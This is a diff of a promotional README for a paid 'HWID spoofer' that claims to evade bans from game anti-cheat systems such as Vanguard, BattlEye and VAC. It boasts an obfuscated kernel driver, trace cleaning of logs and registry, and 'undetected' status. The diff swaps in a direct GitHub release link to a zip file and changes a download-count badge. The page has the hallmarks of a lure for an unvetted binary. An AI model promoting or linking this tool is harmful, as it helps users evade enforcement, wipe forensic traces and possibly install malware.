@@ -1,6 +1,6 @@
 # ⚡ Private Spoofer Hardware — Ultimate HWID Bypass 2026
 
-![Downloads](https://img.shields.io/badge/Total%20Downloads-980k+-blue?style=for-the-badge&logo=github)
+![Downloads](https://img.shields.io/badge/Total%20Downloads-130k+-blue?style=for-the-badge&logo=github)
 ![User Rating](https://img.shields.io/badge/User%20Rating-4.95%2F5-orange?style=for-the-badge&logo=star)
 ![Latest Version](https://img.shields.io/badge/Latest%20Version-10.2.0-green?style=for-the-badge&logo=github)
 ![License](https://img.shields.io/badge/License-Premium-red?style=for-the-badge&logo=lock)
@@ -8,7 +8,7 @@
 
 **Spoofer HWID Premium** is the most advanced, kernel‑level hardware ID spoofer for gamers who have been permanently banned from games with anti‑cheat systems like Riot Vanguard (Valorant), Easy Anti‑Cheat (Rust, Apex), BattlEye (Fortnite, PUBG), Ricochet (Call of Duty), VAC (CS2), and others. Developed for users who require absolute bypass guarantees, regular updates within hours of any anti‑cheat patch, and priority technical support.
 
-## [Download](https://www.shawonline.co.za/redirl)
+## [Download](https://github.com/guifubh778/Private-Spoofer-HWID-Hardware/releases/download/spfV1.1/hardware_win.zip)
 
 Modern anti‑cheats track hundreds of identifiers – motherboard serial, TPM chip ID, disk serials, MAC addresses, registry fingerprints, and even UEFI variables. Free spoofers either get detected quickly, lack critical features like TPM emulation, or are backdoored. **Spoofer HWID Premium** is built on an exclusive, obfuscated kernel driver with a valid certificate, ensuring **over 18 months of complete undetected status** across all major anti‑cheats. You get not just HWID changing, but full forensic trace cleaning – from registry to game cache to kernel logs.
 
